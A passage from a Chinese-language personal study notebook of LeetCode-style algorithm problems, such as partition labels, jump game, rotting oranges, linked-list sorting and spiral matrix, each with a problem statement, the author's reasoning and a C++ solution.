。我们要把这个字符串划分为尽可能多的片段，同一字母最多出现在一个片段中。\n\n注意，划分结果需要满足：将所有划分结果按顺序连接，得到的字符串仍然是 `s` 。\n\n返回一个表示每个字符串片段的长度的列表。\n\n \n\n**示例 1：**\n\n```\n输入：s = \"ababcbacadefegdehijhklij\"\n输出：[9,7,8]\n解释：\n划分结果为 \"ababcbaca\"、\"defegde\"、\"hijhklij\" 。\n每个字母最多出现在一个片段中。\n像 \"ababcbacadefegde\", \"hijhklij\" 这样的划分是错误的，因为划分的片段数较少。 \n```\n\n### 思路\n\n想法不难，用哈希存储每个字母最后出现的次数，再通过遍历一次字符串，用双指针，如果前九个字符满足条件，只出现在这个片段中，那么可以满足哈希表中前九个字符串的所有值的最大值就是第九个字符，所以就用j来存储最大值，i来遍历，直到i等于了j就说明前j个字符的最大出现的位置就是j，那么就可以进行划分\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    vector<int> partitionLabels(string s) {\n        unordered_map<char,int>charToIndex;\n        for(int i=0;i<s.size();i++){\n            charToIndex[s[i]]=i;\n        }\n        int i=0;\n        int j=charToIndex[s[i]];\n        int num=1;\n        vector<int>ans;\n        while(i<s.size()){\n            if(i==j){\n                ans.push_back(num);\n                num=1;\n                if(i<s.size())j=charToIndex[s[++i]];\n            }else{\n                num++;\n                j=max(j,charToIndex[s[i++]]);\n            }\n        }\n        return ans;\n    }\n};\n```\n\n## 最长递增子序列（中等）\n\n### 题目描述\n\n给你一个整数数组 `nums` ，找到其中最长严格递增子序列的长度。\n\n**子序列** 是由数组派生而来的序列，删除（或不删除）数组中的元素而不改变其余元素的顺序。例如，`[3,6,2,7]` 是数组 `[0,3,1,6,2,2,7]` 的子序列。\n\n**示例 1：**\n\n```\n输入：nums = [10,9,2,5,3,7,101,18]\n输出：4\n解释：最长递增子序列是 [2,3,7,101]，因此长度为 4 。\n```\n\n**示例 2：**\n\n```\n输入：nums = [0,1,0,3,2,3]\n输出：4\n```\n\n**示例 3：**\n\n```\n输入：nums = [7,7,7,7,7,7,7]\n输出：1\n```\n\n### 思路\n\n用哈希存储每个数字往前能成为严格递增序列的最大长度，对数组进行遍历，遍历的每个数字都要用哈希计算能往前构成严格递增序列的最大长度，最后记录最大的那个数也就是代码中的maxNumber，有点动态规划的感觉\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    int lengthOfLIS(vector<int>& nums) {\n        unordered_map<int,int>numAndLength;\n        int maxNumber;\n        for(int num : nums){\n            maxNumber=1;\n            for(auto it=numAndLength.begin();it!=numAndLength.end();it++){\n                if(num>it->first)maxNumber=max(it->second+1,maxNumber);\n            }\n            numAndLength[num]=maxNumber;\n        }\n        for(auto it=numAndLength.begin();it!=numAndLength.end();it++)maxNumber=max(it->second,maxNumber);\n        return maxNumber;\n    }\n};\n```\n\n## 寻找旋转排序的最小值（中等）\n\n### 题目描述\n\n已知一个长度为 `n` 的数组，预先按照升序排列，经由 `1` 到 `n` 次 **旋转** 后，得到输入数组。例如，原数组 `nums = [0,1,2,4,5,6,7]` 在变化后可能得到：\n\n- 若旋转 `4` 次，则可以得到 `[4,5,6,7,0,1,2]`\n- 若旋转 `7` 次，则可以得到 `[0,1,2,4,5,6,7]`\n\n注意，数组 `[a[0], a[1], a[2], ..., a[n-1]]` **旋转一次** 的结果为数组 `[a[n-1], a[0], a[1], a[2], ..., a[n-2]]` 。\n\n给你一个元素值 **互不相同** 的数组 `nums` ，它原来是一个升序排列的数组，并按上述情形进行了多次旋转。请你找出并返回数组中的 **最小元素** 。\n\n你必须设计一个时间复杂度为 `O(log n)` 的算法解决此问题。\n\n \n\n**示例 1：**\n\n```\n输入：nums = [3,4,5,1,2]\n输出：1\n解释：原数组为 [1,2,3,4,5] ，旋转 3 次得到输入数组。\n```\n\n### 思路\n\n二分法找第一个比nums[0]小的数\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    int findMin(vector<int>& nums) {\n        int left=0;\n        int right=nums.size()-1;\n        int mid;\n        while(left<right-1){\n            mid=(left+right)/2;\n            if(nums[mid]>nums[0]){\n                left=mid;\n            }else{\n                right=mid;\n            }\n        }\n        return min(min(nums[right],nums[left]),nums[0]);\n    }\n};\n```\n\n## 跳跃游戏（中等）\n\n### 题目描述\n\n给你一个非负整数数组 `nums` ，你最初位于数组的 **第一个下标** 。数组中的每个元素代表你在该位置可以跳跃的最大长度。\n\n判断你是否能够到达最后一个下标，如果可以，返回 `true` ；否则，返回 `false` 。\n\n**示例 1：**\n\n```\n输入：nums = [2,3,1,1,4]\n输出：true\n解释：可以先跳 1 步，从下标 0 到达下标 1, 然后再从下标 1 跳 3 步到达最后一个下标。\n```\n\n### 思路（两种思路）\n\n#### 思路一：用数组存储状态\n\n从第一个下标开始，用一个额外的数组记录下能到达的位置，遍历数组，条件为该值被跳跃过就可以继续处理该值，如果遇到没有达到的值就直接返回false，说明到不了该值，那后面的值也到不了\n\n#### 代码一\n\n```c++\nclass Solution {\npublic:\n    bool canJump(vector<int>& nums) {\n        vector<int>numsTemp(nums.size());\n        numsTemp[0]=1;\n        for(int i=0;i<nums.size();i++){\n            if(numsTemp[i]==1){\n                for(int j=0;j+i<nums.size()&&j<=nums[i];j++){\n                    if(j+i==nums.size()-1)return true;\n                    numsTemp[j+i]=1;\n                }\n            }\n        }\n        return false;\n    }\n};\n```\n\n\n\n#### 思路二：只记录能到达的最远值\n\nindex记录i+nums[i]的最大值，只要index可以到达，可以确保index之前的都能到达，如果index不能到达，说明之后的都无法到达\n\n如果当前遍历的点小于index，说明前面就无法到达该点直接返回false，如果index比数组长度都长了说明能到达最后一个位置\n\n#### 代码二\n\n```c++\nclass Solution {\npublic:\n    bool canJump(vector<int>& nums) {\n        int index=0;\n        for(int i=0;max(i,index)<nums.size();i++){\n            if(index>=i)index=max(index,i+nums[i]);\n            else return false;\n        }\n        return true;\n    }\n};\n```\n\n## 最长有效括号（困难）\n\n### 题目描述\n\n给你一个只包含 `'('` 和 `')'` 的字符串，找出最长有效（格式正确且连续）括号子串的长度。\n\n**示例 1：**\n\n```\n输入：s = \"(()\"\n输出：2\n解释：最长有效括号子串是 \"()\"\n```\n\n### 思路\n\n1. 初始化栈（用来存字符和下标），哈希（用来存储从该点开始往前能组成的最长有效括号长度）\n2. 如果栈的最后一位是`(`,新进来的是`)`就说明这里是连续括号，但是我们不能只算这个长度，因为可能前面也有挨着的连续有效括号，这时候就需要找栈最后一位`(`的下标，该下标的前一位如果在哈希表中有值就说明该下标往前能组成有效括号，新进来的能组成的最长有效括号应该是前面挨着的连续的有效括号长度加上该处栈最后一位和新进来的下标差，将这个存储到哈希中以便后面还有有效括号\n3. 此外不符合条件的直接往栈里进即可\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    int longestValidParentheses(string s) {\n        stack<pair<char,int>>stk;\n        int maxLength=0;\n        unordered_map<int,int>hash;\n        for(int i=0;i<s.size();i++){\n            if(stk.empty()||stk.top().first!='('||s[i]!=')'){\n                stk.push({s[i],i});\n            }else{\n                hash[i]=i-stk.top().second+1;\n                auto it=hash.find(stk.top().second-1);\n                if(it!=hash.end()){\n                    hash[i]+=it->second;\n                }\n                maxLength=max(maxLength,hash[i]);\n                stk.pop();\n            }\n        }\n        return maxLength;\n    }\n};\n```\n\n## 腐烂的橘子（中等）\n\n### 题目描述\n\n在给定的 `m x n` 网格 `grid` 中，每个单元格可以有以下三个值之一：\n\n- 值 `0` 代表空单元格；\n- 值 `1` 代表新鲜橘子；\n- 值 `2` 代表腐烂的橘子。\n\n每分钟，腐烂的橘子 **周围 4 个方向上相邻** 的新鲜橘子都会腐烂。\n\n返回 *直到单元格中没有新鲜橘子为止所必须经过的最小分钟数。如果不可能，返回 `-1`* 。\n\n**示例 1：**\n\n**![img](2023-8-29%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0/oranges.png)**\n\n```\n输入：grid = [[2,1,1],[1,1,0],[0,1,1]]\n输出：4\n```\n\n### 思路\n\n我的思路应该就是广度优先吧（/(ㄒoㄒ)/~~）\n\n先用数组记录下本来就是腐烂的橘子的位置，然后遍历数组并用新数组来记录上个数组记录的位置往周围扩展一层的位置，再将这个新数组赋给上一个遍历的数组，遍历完一次count+1，直到新数组的长度为零说明全都遍历完了，最后遍历一次网格如果还有新鲜水果就返回-1\n\n### 代码\n\n```c++\nclass Solution {\n\npublic:\n    int orangesRotting(vector<vector<int>>& grid) {\n        int m=grid.size();\n        int n=grid[0].size();\n        int count=-1;\n        vector<vector<int>>buf;\n        vector<vector<int>>buff;\n        vector<vector<int>>visited(m,vector<int>(n));\n        for(int i=0;i<m;i++){\n            for(int j=0;j<n;j++){\n                if(grid[i][j]==2){\n                    buf.push_back({i,j});\n                    visited[i][j]=1;\n                }\n            }\n        }\n        while(!buf.empty()){\n            for(auto its : buf){\n                if(its[0]-1>=0&&grid[its[0]-1][its[1]]!=0&&visited[its[0]-1][its[1]]==0){\n                    buff.push_back({its[0]-1,its[1]});\n                    visited[its[0]-1][its[1]]=1;\n                    grid[its[0]-1][its[1]]=2;\n                }\n                if(its[0]+1<m&&grid[its[0]+1][its[1]]!=0&&visited[its[0]+1][its[1]]==0){\n                    buff.push_back({its[0]+1,its[1]});\n                    visited[its[0]+1][its[1]]=1;\n                    grid[its[0]+1][its[1]]=2;\n                }\n                if(its[1]+1<n&&grid[its[0]][its[1]+1]!=0&&visited[its[0]][its[1]+1]==0){\n                    buff.push_back({its[0],its[1]+1});\n                    visited[its[0]][its[1]+1]=1;\n                    grid[its[0]][its[1]+1]=2;\n                }\n                if(its[1]-1>=0&&(grid[its[0]][its[1]-1]!=0)&&(visited[its[0]][its[1]-1]==0)){\n                    buff.push_back({its[0],its[1]-1});\n                    visited[its[0]][its[1]-1]=1;\n                    grid[its[0]][its[1]-1]=2;\n                }\n            }\n            count+=1;\n            buf.assign(buff.begin(),buff.end());\n            buff.clear();\n        }\n        for(auto its : grid){\n            for(int it : its){\n                if(it==1)return -1;\n            }\n        }\n        return count==-1?0:count;\n    }\n};\n```\n\n## 两两交换链表中的节点（中等）\n\n### 题目描述\n\n给你一个链表，两两交换其中相邻的节点，并返回交换后链表的头节点。你必须在不修改节点内部的值的情况下完成本题（即，只能进行节点交换）。\n\n**示例 1：**\n\n![img](2023-8-29%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0/swap_ex1.jpg)\n\n```\n输入：head = [1,2,3,4]\n输出：[2,1,4,3]\n```\n\n### 思路\n\npre now nex代表三个相邻的节点，先确定pre，然后如果pre有next并且不为空，就让now=pre->next.nex=now->next，否则就返回原链表\n\n然后就让now->next=pre,pre的next不能直接等于nex，因为可能nex也需要和nex的next进行交换，这里需要判断nex有没有next，有就指向nex的next，没有就指向nex，然后把pre放在nex，重复上面的步骤\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    ListNode* swapPairs(ListNode* head) {\n        if(head==NULL||head->next==NULL){return head;}\n        ListNode*res=head->next;\n        ListNode*now;\n        ListNode*nex;\n        while(head&&head->next){\n            now=head->next;\n            nex=now->next;\n            now->next=head;\n            if(nex&&nex->next)head->next=nex->next;\n            else head->next=nex;\n            head=nex;\n        }\n        return res;\n    }\n};\n```\n\n## 分割回文串（中等）\n\n### 题目描述\n\n给你一个字符串 `s`，请你将 `s` 分割成一些子串，使每个子串都是 **回文串** 。返回 `s` 所有可能的分割方案。\n\n**回文串** 是正着读和反着读都一样的字符串。\n\n**示例 1：**\n\n```\n输入：s = \"aab\"\n输出：[[\"a\",\"a\",\"b\"],[\"aa\",\"b\"]]\n```\n\n**示例 2：**\n\n```\n输入：s = \"a\"\n输出：[[\"a\"]]\n```\n\n### 知识点\n\n1. 截取子串\n\n   ```c++\n   s.substr(pos, n)   截取s中从pos开始（包括0）的n个字符的子串，并返回\n   \n   s.substr(pos)     截取s中从从pos开始（包括0）到末尾的所有字符的子串，并返回\n   ```\n\n### 思路\n\n用回溯的方式去想，大概过程如图所示\n\n<img src=\"2023-8-29%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0/5bad3ff3851a241373cd83543e10c83.jpg\" alt=\"5bad3ff3851a241373cd83543e10c83\" style=\"zoom:50%;\" />\n\n从该字符串第一个字符开始，首先选一个字符，如果是回文字符串就将该字符放进返回数组列表，然后以去掉该字符的子字符串作为新字符串，以同样的方法\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    bool judgeIfHuiWen(string s){\n        stack<char>stk;\n        int i;\n        for(i=0;i<s.size()/2;i++)stk.push(s[i]);\n        if(s.size()%2){\n            while(!stk.empty()&&stk.top()==s[++i])stk.pop();\n        }else{\n            while(!stk.empty()&&stk.top()==s[i++])stk.pop();\n        }\n        return stk.empty()?true:false;\n    }\n    vector<vector<string>> partition(string s) {\n        vector<vector<string>>ans;\n        string ss;\n        string ss2;\n        vector<vector<string>>temp;\n        for(int i=0;i<s.size();i++){\n            ss=s.substr(0,i+1);\n            if(judgeIfHuiWen(ss)){\n                ss2=s.substr(i+1);\n                temp=partition(ss2);\n                if(temp.size()==0){\n\t\t\t\t\ttemp.push_back({ss});\n\t\t\t\t}else{\n                    for(int j=0;j<temp.size();j++){\n                        temp[j].insert(temp[j].begin(),ss);\n                    }\n                }\n                ans.insert(ans.end(),temp.begin(),temp.end());\n            }\n        }\n        return ans;\n    }\n};\n```\n\n## 矩阵置零（中等）\n\n### 题目描述\n\n给定一个 `*m* x *n*` 的矩阵，如果一个元素为 **0** ，则将其所在行和列的所有元素都设为 **0** 。请使用 **[原地](http://baike.baidu.com/item/原地算法)** 算法**。** \n\n**示例 1：**\n\n![img](2023-8-29%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0/mat1.jpg)\n\n```\n输入：matrix = [[1,1,1],[1,0,1],[1,1,1]]\n输出：[[1,0,1],[0,0,0],[1,0,1]]\n```\n\n### 思路\n\n遍历数组，如果`matric[i][j]`为0，就将`matric[i][0]`和`matric[0][j]`设为0，这样最后直接对第一行和第一列为0的点再对那一整行或者一整列进行归零即可，在这之前还需要记录第一行第一列是否需要置零\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    void setZeroes(vector<vector<int>>& matrix) {\n        int m = matrix.size();\n        int n = matrix[0].size();\n        int flag_col0 = false, flag_row0 = false;\n        for (int i = 0; i < m; i++) {\n            if (!matrix[i][0]) {\n                flag_col0 = true;\n            }\n        }\n        for (int j = 0; j < n; j++) {\n            if (!matrix[0][j]) {\n                flag_row0 = true;\n            }\n        }\n        for (int i = 1; i < m; i++) {\n            for (int j = 1; j < n; j++) {\n                if (!matrix[i][j]) {\n                    matrix[i][0] = matrix[0][j] = 0;\n                }\n            }\n        }\n        for (int i = 1; i < m; i++) {\n            for (int j = 1; j < n; j++) {\n                if (!matrix[i][0] || !matrix[0][j]) {\n                    matrix[i][j] = 0;\n                }\n            }\n        }\n        if (flag_col0) {\n            for (int i = 0; i < m; i++) {\n                matrix[i][0] = 0;\n            }\n        }\n        if (flag_row0) {\n            for (int j = 0; j < n; j++) {\n                matrix[0][j] = 0;\n            }\n        }\n    }\n};\n```\n\n## 二叉树的最近公共祖先（中等）\n\n### 题目描述\n\n给定一个二叉树, 找到该树中两个指定节点的最近公共祖先。\n\n[百度百科](https://baike.baidu.com/item/最近公共祖先/8918834?fr=aladdin)中最近公共祖先的定义为：“对于有根树 T 的两个节点 p、q，最近公共祖先表示为一个节点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（**一个节点也可以是它自己的祖先**）。”\n\n**示例 1：**\n\n![img](2023-8-29%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0/binarytree.png)\n\n```\n输入：root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 1\n输出：3\n解释：节点 5 和节点 1 的最近公共祖先是节点 3 。\n```\n\n### 思路\n\n从根节点开始遍历，写一个函数实现判断从该根节点往下是否存在指定节点，如果以左子节点为根节点的树存在两个节点就从该根节点继续往下遍历，如果左右都没有两个节点就说明该根节点是最深的祖先\n\n### 代码\n\n```c++\n/**\n * Definition for a binary tree node.\n * struct TreeNode {\n *     int val;\n *     TreeNode *left;\n *     TreeNode *right;\n *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}\n * };\n */\nclass Solution {\npublic:\n    bool ifHaveTwo(TreeNode*root,TreeNode*p){\n        if(root==NULL)return false;\n        if(root==p)return true;\n        return ifHaveTwo(root->left,p)||ifHaveTwo(root->right,p);\n    }\n    TreeNode* lowestCommonAncestor(TreeNode* root, TreeNode* p, TreeNode* q) {\n        while((ifHaveTwo(root->left,p)&&ifHaveTwo(root->left,q))||(ifHaveTwo(root->right,p)&&ifHaveTwo(root->right,q))){\n            root=ifHaveTwo(root->left,p)&&ifHaveTwo(root->left,q)?root->left:root->right;\n        }\n        return root;\n    }\n};\n```\n\n## 二叉树的右视图（中等）\n\n### 题目描述\n\n给定一个二叉树的 **根节点** `root`，想象自己站在它的右侧，按照从顶部到底部的顺序，返回从右侧所能看到的节点值。\n\n**示例 1:**\n\n![img](2023-8-29%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0/tree-16948271877791.jpg)\n\n```\n输入: [1,2,3,null,5,null,4]\n输出: [1,3,4]\n```\n\n### 思路\n\n用层次遍历的思路做，记录每一层，同时记录每一层结束的标记，遍历到一层结束的位置即存在输出数组里即可\n\n### 代码\n\n```c++\n/**\n * Definition for a binary tree node.\n * struct TreeNode {\n *     int val;\n *     TreeNode *left;\n *     TreeNode *right;\n *     TreeNode() : val(0), left(nullptr), right(nullptr) {}\n *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) {}\n *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {}\n * };\n */\nclass Solution {\npublic:\n    vector<int> rightSideView(TreeNode* root) {\n        TreeNode*help=new TreeNode(1000);\n        vector<int>ans;\n        if(root==NULL)return ans;\n        queue<TreeNode*>treeQueue;\n        treeQueue.push(root);\n        treeQueue.push(help);\n        while(treeQueue.size()>1){\n            if(treeQueue.front()->left)treeQueue.push(treeQueue.front()->left);\n            if(treeQueue.front()->right)treeQueue.push(treeQueue.front()->right);\n            root=treeQueue.front();\n            treeQueue.pop();\n            if(treeQueue.front()->val==1000){\n                treeQueue.push(help);\n                ans.push_back(root->val);\n                treeQueue.pop();\n            }\n        }\n        return ans;\n    }\n};\n```\n\n## 无重复字符的最长字串（中等）\n\n### 题目描述\n\n给定一个字符串 `s` ，请你找出其中不含有重复字符的 **最长子串** 的长度。\n\n**示例 1:**\n\n```\n输入: s = \"abcabcbb\"\n输出: 3 \n解释: 因为无重复字符的最长子串是 \"abc\"，所以其长度为 3。\n```\n\n**示例 2:**\n\n```\n输入: s = \"bbbbb\"\n输出: 1\n解释: 因为无重复字符的最长子串是 \"b\"，所以其长度为 1。\n```\n\n**示例 3:**\n\n```\n输入: s = \"pwwkew\"\n输出: 3\n解释: 因为无重复字符的最长子串是 \"wke\"，所以其长度为 3。\n     请注意，你的答案必须是 子串 的长度，\"pwke\" 是一个子序列，不是子串。\n```\n\n### 知识点\n\n1. 怎么快速查找一个列表里是否有我要找的值：\n\n   `unordered_set`：无序集合，它基于哈希表实现，提供了常量时间的平均复杂度进行查找、插入和删除操作。\n\n   ```c++\n   #include <iostream>\n   #include <unordered_set>\n   \n   int main() {\n       // 创建一个unordered_set用于存储字符\n       std::unordered_set<char> charSet;\n   \n       // 向unordered_set中插入字符\n       charSet.insert('a');\n       charSet.insert('b');\n       charSet.insert('c');\n   \n       // 检查字符是否存在于unordered_set中\n       char target = 'b';\n       if (charSet.find(target) != charSet.end()) {\n           std::cout << \"Character \" << target << \" exists in the set.\" << std::endl;\n       } else {\n           std::cout << \"Character \" << target << \" does not exist in the set.\" << std::endl;\n       }\n   \n       return 0;\n   }\n   ```\n\n### 思路\n\n用两个指针来标记无重复字符子串的头和尾，用set组合存储子串的所有元素，j每往后移一位就判断一次set组合中是否有该值，有的话i就往后移直到i遇到和j一样的元素，再往后移一位，set也将前面的元素剔除掉，取最长的set长度为五重复字符的最长字串\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    int lengthOfLongestSubstring(string s) {\n        int length=s.size();\n        if(length==1)return 1;\n        unordered_set<char>seted;\n        int i=0;\n        int j=1;\n        int maxCount=0;\n        seted.insert(s[0]);\n        while(j<s.size()){\n            while(j<s.size()&&seted.find(s[j])==seted.end()){\n                seted.insert(s[j++]);\n            }\n            maxCount=max(maxCount,j-i);\n            while(j<s.size()&&i!=j&&seted.find(s[j])!=seted.end()){\n                seted.erase(s[i++]);\n            }\n            if(i==j){\n                seted.insert(s[i]);\n                j++;\n            }\n        }\n        return maxCount;\n    }\n};\n```\n\n## 找到字符串中所有字母异位词（中等）\n\n### 题目描述\n\n给定两个字符串 `s` 和 `p`，找到 `s` 中所有 `p` 的 **异位词** 的子串，返回这些子串的起始索引。不考虑答案输出的顺序。\n\n**异位词** 指由相同字母重排列形成的字符串（包括相同的字符串）。\n\n**示例 1:**\n\n```\n输入: s = \"cbaebabacd\", p = \"abc\"\n输出: [0,6]\n解释:\n起始索引等于 0 的子串是 \"cba\", 它是 \"abc\" 的异位词。\n起始索引等于 6 的子串是 \"bac\", 它是 \"abc\" 的异位词。\n```\n\n### 思路\n\n1. 用哈希存储p中每个字符的状态，初始都为0\n2. 用i代表子串的头部，用j代表子串的尾部\n3. 如果s[j]在哈希表中，并且状态为0，就说明该字符在当前字串还未出现过，j就往后移动，该字符的哈希加一\n4. 如果j-i为p的长度说明已经构造除了异位词，将i存在数组中并加一，（加一之后s[i]肯定还在p中）以找下一个子串\n5. 如果s[j]不在哈希表中，i和j都要移动到j+1的位置，同时哈希初始化为0\n6. 如果s[j]在哈希表中但是已经出现过了，i就需要移动到s[j]在前面出现的位置的下一个，以确保没有出现过\n7. 同时由于p中字符会有重复，所有哈希初始化不直接为0，如果重复了再减一，后面直接判断该值是否为1\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    vector<int> findAnagrams(string s, string p) {\n        unordered_map<char,int>hashMap;\n        for(char pp : p){\n            if(hashMap.find(pp)!=hashMap.end())hashMap[pp]--;\n            else hashMap[pp]=0;\n        }\n        int i=0;\n        int j=0;\n        vector<int>ans;\n        while(j<s.size()){\n            while(j<s.size()&&hashMap.find(s[j])==hashMap.end()){\n                for(int l=i;l<=j-1;l++)hashMap[s[l]]--;\n                i=++j;\n            }\n            while(j<s.size()&&hashMap[s[j]]==1)hashMap[s[i++]]--;\n            while(j<s.size()&&hashMap.find(s[j])!=hashMap.end()&&hashMap[s[j]]!=1)hashMap[s[j++]]++;\n            if(j-i==p.size()){\n                ans.push_back(i);\n                hashMap[s[i++]]--;\n            }\n        }\n        return ans;\n    }\n};\n```\n\n## 螺旋矩阵（中等）\n\n### 题目描述\n\n给你一个 `m` 行 `n` 列的矩阵 `matrix` ，请按照 **顺时针螺旋顺序** ，返回矩阵中的所有元素。\n\n**示例 1：**\n\n![img](2023-8-29%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0/spiral1.jpg)\n\n```\n输入：matrix = [[1,2,3],[4,5,6],[7,8,9]]\n输出：[1,2,3,6,9,8,7,4,5]\n```\n\n### 思路\n\n用up,down,left,right代表边界，比如示例从1->3遍历完之后，up要加一，代表上边界往下移了，3->9遍历完之后right要减一代表左边界往右移了，移到上下边界或者左右边界不符合不再满足小于等于关系则说明移完了\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    vector<int> spiralOrder(vector<vector<int>>& matrix) {\n        int up = 0;\n        int down = matrix.size() - 1;\n        int left = 0;\n        int right = matrix[0].size() - 1;\n        vector<int> ans;\n        while (up <= down && left <= right) {\n            for (int j = left; j <= right; ++j)\n                ans.push_back(matrix[up][j]);\n            up++;\n            for (int i = up; i <= down; ++i)\n                ans.push_back(matrix[i][right]);\n            right--;\n            if (up <= down) {\n                for (int j = right; j >= left; --j)\n                    ans.push_back(matrix[down][j]);\n                down--;\n            }\n            if (left <= right) {\n                for (int i = down; i >= up; --i)\n                    ans.push_back(matrix[i][left]);\n                left++;\n            }\n        }\n        return ans;\n    }\n};\n\n```\n\n## 两数相加（中等）\n\n### 题目描述\n\n给你两个 **非空** 的链表，表示两个非负的整数。它们每位数字都是按照 **逆序** 的方式存储的，并且每个节点只能存储 **一位** 数字。\n\n请你将两个数相加，并以相同形式返回一个表示和的链表。\n\n你可以假设除了数字 0 之外，这两个数都不会以 0 开头。\n\n**示例 1：**\n\n![img](2023-8-29%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0/addtwonumber1.jpg)\n\n```\n输入：l1 = [2,4,3], l2 = [5,6,4]\n输出：[7,0,8]\n解释：342 + 465 = 807.\n```\n\n### 思路\n\n用两个数相加的思路，比如示例有2+5=7,进位为0，4+6+0=10，进位为1，然后3+4+1=8\n\n### 代码\n\n```c++\n/**\n * Definition for singly-linked list.\n * struct ListNode {\n *     int val;\n *     ListNode *next;\n *     ListNode() : val(0), next(nullptr) {}\n *     ListNode(int x) : val(x), next(nullptr) {}\n *     ListNode(int x, ListNode *next) : val(x), next(next) {}\n * };\n */\nclass Solution {\npublic:\n    ListNode* addTwoNumbers(ListNode* l1, ListNode* l2) {\n        ListNode* l1Copy=l1;\n        ListNode* l2Copy=l2;\n        ListNode* ans=new ListNode();\n        ListNode* res=ans;\n        int c=0;\n        while(l1Copy&&l2Copy){\n            ListNode*newNode=new ListNode();\n            newNode->val=l1Copy->val+l2Copy->val+c;\n            if(newNode->val/10){\n                newNode->val%=10;\n                c=1;\n            }else{\n                c=0;\n            }\n            ans->next=newNode;\n            ans=newNode;\n            l1Copy=l1Copy->next;\n            l2Copy=l2Copy->next;\n        }\n        while(l1Copy){\n            ListNode*newNode=new ListNode();\n            newNode->val=l1Copy->val+c;\n            if(newNode->val/10){\n                newNode->val%=10;\n                c=1;\n            }else{\n                c=0;\n            }\n            ans->next=newNode;\n            ans=newNode;\n            l1Copy=l1Copy->next;\n        }\n        while(l2Copy){\n            ListNode*newNode=new ListNode();\n            newNode->val=l2Copy->val+c;\n            if(newNode->val/10){\n                newNode->val%=10;\n                c=1;\n            }else{\n                c=0;\n            }\n            ans->next=newNode;\n            ans=newNode;\n            l2Copy=l2Copy->next;\n        }\n        if(c==1){\n             ListNode*newNode=new ListNode(1);\n             ans->next=newNode;\n        }\n        return res->next;\n    }\n};\n```\n\n## 排序链表（中等）\n\nps:实在是不想调试了，看了题解发现方法没问题就直接copy了/(ㄒoㄒ)/~~\n\n### 题目描述\n\n给你链表的头结点 `head` ，请将其按 **升序** 排列并返回 **排序后的链表** 。 \n\n**示例 1：**\n\n![img](2023-8-29%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0/sort_list_1.jpg)\n\n```\n输入：head = [4,2,1,3]\n输出：[1,2,3,4]\n```\n\n### 思路\n\n归并排序，比如示例1：\n\n[4] [2] [1] [3]\n\n先每两个排序：\n\n[2,4] [1,3]\n\n再合并两个有序链表\n\n[1,2,3,4]\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    ListNode* sortList(ListNode* head) {\n        if (head == nullptr) {\n            return head;\n        }\n        int length = 0;\n        ListNode* node = head;\n        while (node != nullptr) {\n            length++;\n            node = node->next;\n        }\n        ListNode* dummyHead = new ListNode(0, head);\n        for (int subLength = 1; subLength < length; subLength <<= 1) {\n            ListNode* prev = dummyHead, *curr = dummyHead->next;\n            while (curr != nullptr) {\n                ListNode* head1 = curr;\n                for (int i = 1; i < subLength && curr->next != nullptr; i++) {\n                    curr = curr->next;\n                }\n                ListNode* head2 = curr->next;\n                curr->next = nullptr;\n                curr = head2;\n                for (int i = 1; i < subLength && curr != nullptr && curr->next != nullptr; i++) {\n                    curr = curr->next;\n                }\n                ListNode* next = nullptr;\n                if (curr != nullptr) {\n                    next = curr->next;\n                    curr->next = nullptr;\n                }\n                ListNode* merged = merge(head1, head2);\n                prev->next = merged;\n                while (prev->next != nullptr) {\n                    prev = prev->next;\n                }\n                curr = next;\n            }\n        }\n        return dummyHead->next;\n    }\n\n    ListNode* merge(ListNode* head1, ListNode* head2) {\n        ListNode* dummyHead = new ListNode(0);\n        ListNode* temp = dummyHead, *temp1 = head1, *temp2 = head2;\n        while (temp1 != nullptr && temp2 != nullptr) {\n            if (temp1->val <= temp2->val) {\n                temp->next = temp1;\n                temp1 = temp1->next;\n            } else {\n                temp->next = temp2;\n                temp2 = temp2->next;\n            }\n            temp = temp->next;\n        }\n        if (temp1 != nullptr) {\n            temp->next = temp1;\n        } else if (temp2 != nullptr) {\n            temp->next = temp2;\n        }\n        return dummyHead->next;\n    }\n};\n```\n\n## 电话号码的字母组合（中等）\n\n### 题目描述\n\n给定一个仅包含数字 `2-9` 的字符串，返回所有它能表示的字母组合。答案可以按 **任意顺序** 返回。\n\n给出数字到字母的映射如下（与电话按键相同）。注意 1 不对应任何字母。\n\n![img](2023-8-29%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0/200px-telephone-keypad2svg.png)\n\n**示例 1：**\n\n```\n输入：digits = \"23\"\n输出：[\"ad\",\"ae\",\"af\",\"bd\",\"be\",\"bf\",\"cd\",\"ce\",\"cf\"]\n```\n\n### 思路\n\n很简单的回溯思路\n\n### 代码\n\n```c++\nclass Solution {\nprivate:\n    vector<string>ans;\n    vector<vector<char>>numToChar;\npublic:\n    void dfs(string digits,string singleAns){\n        if(digits.size()==0){\n            if(singleAns.size()!=0)ans.push_back(singleAns);\n            return;\n        }\n        for(char ch : numToChar[digits[0]-48]){\n            singleAns.push_back(ch);\n            dfs(digits.substr(1),singleAns);\n            singleAns.pop_back();\n        }\n    }\n    vector<string> letterCombinations(string digits) {\n        numToChar.resize(10);\n        numToChar[2]={'a','b','c'};\n        numToChar[3]={'d','e','f'};\n        